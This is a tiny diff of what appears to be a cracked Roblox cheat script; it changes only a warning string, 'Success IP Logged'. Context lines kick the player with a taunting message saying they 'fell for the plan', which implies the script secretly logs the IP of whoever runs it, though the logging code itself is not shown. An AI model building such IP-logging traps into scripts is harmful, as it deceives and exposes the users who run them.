@@ -1,4 +1,4 @@
- warn("Success IP Logged")
+ warn("Success IP Loggedd")
                 game.Players.LocalPlayer:Kick('[ASTRAL PROECTION] Hello world! You have fell for the plan! This crack has been archived by onlyanth! .gg/astralttm") 
 local httpService = game:GetService('HttpService')
 local ThemeManager = {} do
